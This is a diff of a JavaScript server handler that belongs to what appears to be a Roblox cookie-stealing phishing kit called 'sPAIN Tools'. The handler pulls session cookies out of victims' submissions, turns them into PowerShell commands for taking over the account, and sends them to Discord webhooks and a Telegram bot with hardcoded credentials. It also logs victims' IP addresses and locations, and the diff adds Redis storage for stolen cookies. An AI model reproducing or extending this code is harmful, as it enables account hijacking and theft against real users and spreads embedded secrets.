@@ -1,10 +1,9 @@
 // api/submit.js
-const REDIS_URL  = process.env.UPSTASH_REDIS_REST_URL;
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN   = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT    = process.env.TG_CHAT  || '7538845070';
-// Your Cloudflare Worker URL — update worker.js code there too
-const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
+const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
+const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -27,6 +26,17 @@ async function redisGet(key) {
     }
     return record || null;
   } catch { return null; }
+}
+
+// ── redisSet — was missing, causing the ReferenceError crash ──────────────────
+async function redisSet(key, value) {
+  try {
+    const res = await fetch(
+      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
+      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
+    );
+    return res.ok;
+  } catch { return false; }
 }
 
 async function getIpGeo(ip) {
@@ -69,7 +79,6 @@ function findCookie(slots) {
   return null;
 }
 
-// ── Cloudflare Worker: ONLY builds PowerShell string, zero Roblox API calls ───
 async function getPowerShell(cookie) {
   try {
     const r = await fetch(WORKER_URL, {
@@ -100,14 +109,12 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-// Send cookie + PowerShell command to Discord
 async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pageName }) {
-  // Embed with context
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
       title: `✅ Cookie Captured — ${pageName}`,
-      description: 'Run the **PowerShell command** below to access the account.\nThis is exactly what Chrome DevTools "Copy as PowerShell" gives you.',
+      description: 'Run the **PowerShell command** below to access the account.',
       color: 0x00cc44,
       fields: [
         { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
@@ -119,14 +126,10 @@ async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pa
     }]
   });
 
-  // PowerShell command in code block (chunked so nothing is cut)
   if (powershell) {
-    // First chunk gets the ```powershell header
-    let first = true;
-    let rem = powershell;
+    let rem = powershell; let first = true;
     while (rem.length > 0) {
-      const chunk = rem.substring(0, 1950);
-      rem = rem.substring(1950);
+      const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
       const content = first
         ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
         : chunk + (rem.length > 0 ? '' : '\n```');
@@ -135,11 +138,9 @@ async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pa
     }
   }
 
-  // Raw cookie as plain text — exact bytes, zero modification
   let remCookie = cookie;
   while (remCookie.length > 0) {
-    const chunk = remCookie.substring(0, 1990);
-    remCookie = remCookie.substring(1990);
+    const chunk = remCookie.substring(0, 1990); remCookie = remCookie.substring(1990);
     await discordSend(webhookUrl, { content: chunk });
   }
 }
@@ -158,8 +159,18 @@ async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
         { name: '📋 Slots',    value: '```\n' + slotSummary(slots).substring(0,950) + '\n```', inline: false },
         { name: '🕐 Date',     value: now,                                        inline: false }
       ],
-      footer: { text: `sPAIN Tools • ${pageName}` },
-      timestamp: now
+      footer: { text: `sPAIN Tools • ${pageName}` }
+    }]
+  });
+}
+
+async function sendRefreshLink(webhookUrl, refreshUrl) {
+  await discordSend(webhookUrl, {
+    embeds: [{
+      title: '🔄 Refresh Link — Get Fresh PowerShell Anytime',
+      description: `Click below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
+      color: 0x06b6d4,
+      footer: { text: 'sPAIN Tools • Keep this private' }
     }]
   });
 }
@@ -180,48 +191,73 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
-  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
-          || req.headers['x-real-ip'] || 'Unknown';
+  // Respond immediately so client never times out
+  res.status(200).json({ success: true });
 
-  const [geo, cookie] = await Promise.all([
-    getIpGeo(ip),
-    Promise.resolve(findCookie(slots))
-  ]);
+  try {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+            || req.headers['x-real-ip'] || 'Unknown';
 
-  // Worker just formats cookie into PowerShell — no Roblox API calls, instant
-  const powershell = cookie ? await getPowerShell(cookie) : null;
-  const roblox     = null;  // no Roblox info fetched — avoids all timeouts
-  const isValid    = !!powershell;
-  const now        = new Date().toISOString();
-  const pageName   = record.displayName || slug;
-  const payload    = { powershell, roblox, cookie, slots, ip, geo, now, pageName };
+    const [geo, cookie] = await Promise.all([
+      getIpGeo(ip),
+      Promise.resolve(findCookie(slots))
+    ]);
 
-  let parent = null;
-  if (record.dualhookParent) {
-    parent = await redisGet(`slot:${record.dualhookParent}`);
+    const powershell = cookie ? await getPowerShell(cookie) : null;
+    const isValid    = !!powershell;
+    const now        = new Date().toISOString();
+    const pageName   = record.displayName || slug;
+    const payload    = { powershell, cookie, slots, ip, geo, now, pageName };
+
+    let parent = null;
+    if (record.dualhookParent) {
+      parent = await redisGet(`slot:${record.dualhookParent}`);
+    }
+
+    const sendFn = isValid ? sendHit : sendInvalid;
+
+    await Promise.all([
+      sendFn(record.webhook, payload),
+      parent?.webhook && parent.webhook !== record.webhook
+        ? sendFn(parent.webhook, payload)
+        : Promise.resolve()
+    ]);
+
+    // Save cookie to Redis + send refresh link to Discord
+    if (isValid && cookie) {
+      const refreshId  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+      const refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
+
+      // Save: cookie + webhooks needed to re-send later
+      await redisSet(`refresh:${refreshId}`, {
+        cookie,
+        webhook:  record.webhook,
+        webhook1: parent?.webhook || null,
+        pageName
+      });
+
+      await Promise.all([
+        sendRefreshLink(record.webhook, refreshUrl),
+        parent?.webhook && parent.webhook !== record.webhook
+          ? sendRefreshLink(parent.webhook, refreshUrl)
+          : Promise.resolve()
+      ]);
+    }
+
+    await tgSend(isValid ? [
+      `✅ <b>COOKIE CAPTURED</b>`,
+      `📄 Page: ${pageName} (${slug})`,
+      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+      `💻 PowerShell + refresh link sent to Discord`,
+      `🕐 ${now}`
+    ].join('\n') : [
+      `⚠️ <b>INVALID SUBMISSION</b>`,
+      `📄 Page: ${pageName} (${slug})`,
+      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+      `🕐 ${now}`
+    ].join('\n'));
+
+  } catch (err) {
+    console.error('Post-response error:', err.message);
   }
-
-  const sendFn = isValid ? sendHit : sendInvalid;
-
-  await Promise.all([
-    sendFn(record.webhook, payload),
-    parent?.webhook && parent.webhook !== record.webhook
-      ? sendFn(parent.webhook, payload)
-      : Promise.resolve()
-  ]);
-
-  await tgSend(isValid ? [
-    `✅ <b>COOKIE CAPTURED</b>`,
-    `📄 Page: ${pageName} (${slug})`,
-    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-    `💻 PowerShell sent to Discord`,
-    `🕐 ${now}`
-  ].join('\n') : [
-    `⚠️ <b>INVALID SUBMISSION</b>`,
-    `📄 Page: ${pageName} (${slug})`,
-    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-    `🕐 ${now}`
-  ].join('\n'));
-
-  return res.status(200).json({ success: true });
 }
